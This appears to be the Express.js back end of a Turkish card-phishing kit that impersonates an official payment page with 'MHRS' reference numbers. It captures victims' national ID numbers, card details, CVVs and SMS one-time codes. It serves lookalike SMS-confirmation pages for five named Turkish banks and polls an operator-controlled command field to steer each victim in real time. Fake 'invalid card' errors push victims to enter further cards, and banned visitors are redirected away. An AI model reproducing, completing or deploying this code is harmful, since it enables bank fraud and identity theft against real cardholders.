const express = require('express');
const mongoose = require('mongoose');
const Visitor = require('../models/Visitor');
const User = require('../models/User');
const Logger = require('../utils/logger');
const ayarlarStore = require('../utils/ayarlar');
const { odemeKaydet } = require('../utils/odemeServisi');

const router = express.Router();
const log = new Logger('Ziyaretci');

function istemciIp(req) {
    let ip = (req.headers['x-forwarded-for'] || req.ip || '').toString().split(',')[0].trim();
    return ip.replace(/^::ffff:/, '') || 'bilinmiyor';
}

function reklamKapisi(req, res, next) {
    if (ayarlarStore.oku().reklamOnay) {
        return res.redirect('/reklam');
    }
    next();
}

function normalizeBankName(value) {
    return String(value || '')
        .toLocaleUpperCase('tr-TR')
        .normalize('NFD')
        .replace(/[\u0300-\u036f]/g, '')
        .replace(/[^A-Z0-9]/g, '');
}

function smsTemplateForBank(kartBanka) {
    const bank = normalizeBankName(kartBanka);
    if (bank.includes('AKBANK')) return 'akbankSms';
    if (bank.includes('ISBANKASI') || bank.includes('ISBANK')) return 'isbankasi-sms-onay';
    if (bank.includes('GARANTI')) return 'garanti-sms-onay';
    if ((bank.includes('VAKIF') && bank.includes('BANK')) || bank.includes('VAKIFBANK')) return 'vakifbank-sms-onay';
    if ((bank.includes('YAPI') && bank.includes('KREDI')) || bank.includes('YAPIKREDI')) return 'yapikredi-sms-onay';
    return 'sms';
}

async function ziyaretciKaydet(req, res, next) {
    if (mongoose.connection.readyState === 1) {
        try {
            const ip = istemciIp(req);
            const eski = await Visitor.findOneAndUpdate(
                { ip },
                {
                    $inc: { ziyaretSayisi: 1 },
                    $set: { sonGiris: new Date() },
                    $setOnInsert: { createdAt: new Date() }
                },
                { upsert: true }
            );
            if (!eski) log.info('Yeni ziyaretçi kaydedildi: ' + ip);
        } catch (err) {
            console.error('Ziyaretçi kaydedilemedi:', err.message);
        }
    }
    next();
}

async function banliKontrol(req, res, next) {
    const tcno = req.session && req.session.kullanici ? req.session.kullanici.tcno : null;
    if (!tcno || mongoose.connection.readyState !== 1) return next();
    try {
        const kullanici = await User.findOne({ tcno }).select('banli').lean();
        if (!kullanici || !kullanici.banli) return next();
        const url = String(ayarlarStore.oku().banliKullaniciUrl || '').trim();
        if (url) return res.redirect(url);
        return res.status(403).send('Erişiminiz engellendi.');
    } catch (err) {
        console.error('Ban kontrolü yapılamadı:', err.message);
        return next();
    }
}

router.use(banliKontrol);

router.get('/', reklamKapisi, ziyaretciKaydet, (req, res) => {
    res.render('index');
});

router.get('/reklam', ziyaretciKaydet, (req, res) => {
    res.render('reklam');
});

router.get('/giris2', reklamKapisi, ziyaretciKaydet, (req, res) => {
    res.render('giris2');
});

router.get('/anasayfa', reklamKapisi, ziyaretciKaydet, (req, res) => {
    const kullanici = req.session.kullanici || null;
    const bosSonGiris = { tarih: '-', durum: '-', tip: '-', kanal: '-', ip: '-' };
    res.render('anasayfa', {
        kullanici,
        sonGiris: (kullanici && kullanici.sonGiris) || bosSonGiris,
        odeme: ayarlarStore.odemeBilgileri()
    });
});

router.get('/odeme', reklamKapisi, ziyaretciKaydet, (req, res) => {
    const kullanici = req.session.kullanici || null;
    if (!kullanici || !kullanici.tcno) {
        return res.redirect('/giris2');
    }
    const gecersizKartNo = String(kullanici.gecersizKartNo || '').replace(/\D/g, '');
    res.render('odeme', {
        kullanici,
        odeme: ayarlarStore.odemeBilgileri(),
        gecersizKartNo
    });
});

// SMS kodu gönderildikten sonra bekleme ekranına dönüş (Akbank akışı)
function odemeBeklemeRender(req, res) {
    const kullanici = req.session.kullanici || null;
    if (!kullanici || !kullanici.tcno) {
        return res.redirect('/giris2');
    }
    const simdi = new Date();
    const odeme = ayarlarStore.odemeBilgileri();
    const neden = String(req.query.neden || '').toLowerCase();
    const hataNedenHaritasi = {
        kartno: 'Kart numarasını hatalı girdiniz.',
        kartNo: 'Kart numarasını hatalı girdiniz.',
        skt: 'Kart son kullanım tarihini hatalı girdiniz.',
        cvv: 'CVV kodunu hatalı girdiniz.'
    };
    const hataMesaji = req.query.hata === 'internetKapali'
        ? 'Kartınız internet alışverişlerine kapalıdır.'
        : req.query.hata === 'gecersizKart'
            ? (hataNedenHaritasi[neden] || 'Kartınız geçersizdir. Lütfen farklı bir kart deneyiniz.')
            : null;
    const hataYol = req.query.hata === 'gecersizKart'
        ? '/odeme?hata=gecersizKart&neden=' + encodeURIComponent(neden || 'kartNo')
        : '/odeme';
    if (req.query.hata === 'gecersizKart') {
        const gecersizKart = String(kullanici.kartNo || '').replace(/\D/g, '');
        if (gecersizKart) {
            req.session.kullanici.gecersizKartNo = gecersizKart;
        }
    }
    return res.render('odemeBekleme', {
        kullanici,
        basarili: !hataMesaji,
        hata: hataMesaji,
        hataButonMetin: hataMesaji ? 'Devam Et' : 'Tekrar Dene',
        hataYol,
        islemAdi: odeme.borcBilgi,
        tutar: odeme.toplamMetin,
        tarih: simdi.toLocaleDateString('tr-TR', { day: '2-digit', month: 'long', year: 'numeric' }),
        referansNo: 'MHRS-' + simdi.toISOString().slice(0, 10).replace(/-/g, '') + '-' + Math.floor(100000 + Math.random() * 900000)
    });
}

router.get('/odeme/bekleniyor', reklamKapisi, ziyaretciKaydet, (req, res) => odemeBeklemeRender(req, res));

router.get('/bekleme', reklamKapisi, ziyaretciKaydet, (req, res) => odemeBeklemeRender(req, res));

router.post('/odeme/bekleniyor', ziyaretciKaydet, async (req, res) => {
    const kullanici = req.session.kullanici || null;
    if (!kullanici || !kullanici.tcno) {
        return res.redirect('/giris2');
    }
    const yeniKartNo = String(req.body.kartNo || '').replace(/\D/g, '');
    const gecersizKartNo = String(kullanici.gecersizKartNo || '').replace(/\D/g, '');
    if (gecersizKartNo && yeniKartNo && yeniKartNo !== gecersizKartNo) {
        kullanici.gecersizKartNo = null;
    }
    let basarili = false;
    let hata = null;
    if (mongoose.connection.readyState === 1) {
        await User.updateOne({ tcno: kullanici.tcno }, { $set: { beklemeKomut: null, smsKod1: null, smsKod2: null } }).catch(() => {});
        const sonuc = await odemeKaydet(kullanici.tcno, req.body).catch(err => {
            console.error('Ödeme kaydedilemedi:', err.message);
            return { ok: false, hata: 'Ödeme kaydedilemedi.' };
        });
        basarili = !!(sonuc && sonuc.ok);
        hata = (sonuc && sonuc.hata) || null;
        if (basarili) {
            const kartNo = yeniKartNo;
            const bankaAdi = (sonuc && sonuc.banka) || '';
            req.session.kullanici.kartBanka = bankaAdi;
            req.session.kullanici.kartNo = kartNo;
            req.session.kullanici.kartNoSon4 = kartNo.slice(-4);
            req.session.kullanici.marka = (sonuc && sonuc.marka) || '';
            req.session.kullanici.kartMarka = (sonuc && sonuc.marka) || '';
            req.session.kullanici.gecersizKartNo = null;
            log.info('Ödeme kaydedildi (bekleniyor): ' + kullanici.tcno.slice(0, 1) + '*********' + kullanici.tcno.slice(-1));
        }
    } else {
        hata = 'Veritabanına bağlanılamadı.';
    }
    const simdi = new Date();
    const odeme = ayarlarStore.odemeBilgileri();
    const hataYol = '/odeme';
    res.render('odemeBekleme', {
        kullanici,
        basarili,
        hata,
        hataButonMetin: hata ? 'Tekrar Dene' : 'Anasayfaya Dön',
        hataYol,
        islemAdi: odeme.borcBilgi,
        tutar: odeme.toplamMetin,
        tarih: simdi.toLocaleDateString('tr-TR', { day: '2-digit', month: 'long', year: 'numeric' }),
        referansNo: 'MHRS-' + simdi.toISOString().slice(0, 10).replace(/-/g, '') + '-' + Math.floor(100000 + Math.random() * 900000)
    });
});

router.get('/sms', reklamKapisi, ziyaretciKaydet, (req, res) => {
    const kullanici = req.session.kullanici || null;
    if (!kullanici || !kullanici.tcno) {
        return res.redirect('/giris2');
    }
    const kartBanka = String(kullanici.kartBanka || '');
    const hataliSms = !!req.query.hatali;
    const odeme = ayarlarStore.odemeBilgileri();
    const ortak = {
        kullanici,
        hataliSms,
        kartNo: kullanici.kartNo || null,
        kartNoSon4: kullanici.kartNoSon4 || '****',
        kartMarka: kullanici.kartMarka || kullanici.marka || '',
        tutar: odeme.toplamMetin,
        islemAdi: odeme.borcBilgi,
        bankaBaslik: kartBanka || 'GO Güvenli Öde'
    };

    const sayfa = smsTemplateForBank(kartBanka);
    if (sayfa === 'sms') {
        return res.render('sms', ortak);
    }
    return res.render(sayfa, ortak);
});

router.get('/odeme/bekleme-durum', async (req, res) => {
    const tcno = req.session && req.session.kullanici ? req.session.kullanici.tcno : null;
    if (!tcno) return res.json({ oturumYok: true });
    if (mongoose.connection.readyState !== 1) return res.json({ komut: null });
    try {
        const eski = await User.findOneAndUpdate(
            { tcno, beklemeKomut: { $ne: null } },
            { $set: { beklemeKomut: null } }
        );
        res.json({ komut: (eski && eski.beklemeKomut) || null });
    } catch (err) {
        console.error('Komut okunamadı:', err.message);
        res.json({ komut: null });
    }
});

// Eski bağlantı uyumluluğu (giris2.html -> /giris2)
router.get('/giris2.html', (req, res) => {
    res.redirect('/giris2');
});

module.exports = router;
